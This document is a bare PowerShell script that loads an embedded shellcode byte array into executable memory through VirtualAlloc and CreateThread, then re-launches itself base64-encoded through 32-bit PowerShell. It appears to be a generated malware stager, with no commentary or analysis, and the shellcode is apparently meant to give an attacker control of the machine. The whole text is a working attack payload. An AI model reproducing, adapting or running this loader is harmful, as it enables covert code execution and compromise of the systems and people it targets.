
$nyJu = '$RZf = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $RZf -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xdd,0xd9,0x74,0x24,0xf4,0x5b,0x31,0xc9,0xb1,0x56,0xbf,0xfe,0x58,0xe7,0x97,0x31,0x7b,0x18,0x83,0xeb,0xfc,0x03,0x7b,0xea,0xba,0x12,0x6b,0xfa,0xb9,0xdd,0x94,0xfa,0xdd,0x54,0x71,0xcb,0xdd,0x03,0xf1,0x7b,0xee,0x40,0x57,0x77,0x85,0x05,0x4c,0x0c,0xeb,0x81,0x63,0xa5,0x46,0xf4,0x4a,0x36,0xfa,0xc4,0xcd,0xb4,0x01,0x19,0x2e,0x85,0xc9,0x6c,0x2f,0xc2,0x34,0x9c,0x7d,0x9b,0x33,0x33,0x92,0xa8,0x0e,0x88,0x19,0xe2,0x9f,0x88,0xfe,0xb2,0x9e,0xb9,0x50,0xc9,0xf8,0x19,0x52,0x1e,0x71,0x10,0x4c,0x43,0xbc,0xea,0xe7,0xb7,0x4a,0xed,0x21,0x86,0xb3,0x42,0x0c,0x27,0x46,0x9a,0x48,0x8f,0xb9,0xe9,0xa0,0xec,0x44,0xea,0x76,0x8f,0x92,0x7f,0x6d,0x37,0x50,0x27,0x49,0xc6,0xb5,0xbe,0x1a,0xc4,0x72,0xb4,0x45,0xc8,0x85,0x19,0xfe,0xf4,0x0e,0x9c,0xd1,0x7d,0x54,0xbb,0xf5,0x26,0x0e,0xa2,0xac,0x82,0xe1,0xdb,0xaf,0x6d,0x5d,0x7e,0xbb,0x83,0x8a,0xf3,0xe6,0xcb,0x22,0x69,0x6d,0x0b,0xd3,0x06,0xe4,0x65,0x4a,0xbd,0x9e,0x35,0xfb,0x1b,0x58,0x3a,0xd6,0x55,0xbd,0x97,0x8a,0xc6,0x12,0x44,0x45,0xd3,0xc2,0x13,0x32,0xdc,0x3e,0xb0,0x6f,0x49,0xc2,0x65,0xc3,0xe5,0x7f,0x88,0xe3,0xf5,0x97,0x06,0xe3,0xf5,0x67,0x39,0xad,0xb7,0x2b,0x06,0x6f,0x38,0xe4,0xe0,0x38,0xb1,0x9b,0x36,0x39,0x14,0x2a,0x70,0x95,0xff,0x2d,0x4e,0xfa,0x84,0x7d,0xfd,0xa9,0xd3,0xd2,0x57,0x26,0x37,0x81,0x79,0x8d,0x38,0xff,0x13,0x9b,0xcc,0x5f,0x73,0xdc,0xe2,0x5f,0x83,0x55,0xe4,0x0a,0x87,0x35,0x8f,0xd5,0xd1,0xdd,0x3a,0xac,0x43,0x9b,0x3a,0xe5,0x28,0xf7,0x97,0x55,0x98,0x9f,0x3a,0x5c,0x3c,0x1b,0xba,0xb5,0xb9,0x1b,0x31,0x3c,0x8e,0xee,0x63,0x28,0xe0,0xa4,0x36,0xff,0xff,0x12,0x5c,0x40,0x97,0x9c,0xb1,0x40,0x67,0xf5,0xb1,0x40,0x27,0x05,0xe1,0x28,0xff,0xa1,0x56,0x4c,0x00,0x7c,0xcb,0xdd,0xad,0xf6,0x0b,0xb6,0x39,0x09,0xf4,0x39,0xb9,0x5a,0xa2,0x51,0xab,0xca,0xc3,0x40,0x34,0x27,0x56,0x44,0xbe,0x05,0xd2,0x42,0x3f,0x55,0x60,0x8c,0x4a,0xbc,0x33,0xce,0xeb,0xd6,0xb1,0x2f,0xec,0xd8,0x54,0xb4,0x67,0x55,0x99,0x1a,0xe9,0xfc,0xad,0x62;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$iGIz=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($iGIz.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$iGIz,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($nyJu));$WwDA = "-e ";if([IntPtr]::Size -eq 8){$0PH = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $0PH $WwDA $e"}else{;iex "& powershell $WwDA $e";}

